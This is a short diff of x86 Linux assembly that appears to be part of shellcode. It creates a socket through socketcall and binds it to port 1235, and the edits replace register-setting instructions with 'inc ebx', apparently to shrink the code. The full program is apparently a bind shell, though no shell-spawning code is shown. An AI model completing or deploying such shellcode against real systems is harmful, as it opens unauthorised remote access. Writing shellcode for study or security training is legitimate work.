@@ -14,7 +14,7 @@ _start:
     push 0x1
     push 0x2
     mov ecx, esp
-    mov bl,0x1
+    inc ebx
     mov al, 0x66
     int 0x80
     ;}
@@ -25,7 +25,6 @@ _start:
     ;sockaddr struct
     ;{
 
-    pop ebx ;latest pushed value is 0x2, we're gonna need it for SYS_BIND
     push eax
     push word 0xD304
     push word 0x2
@@ -39,6 +38,7 @@ _start:
     push edx
     mov ecx, esp
     ;pop ebx already popped
+    inc ebx
     mov al,0x66
     int 0x80
     ;}
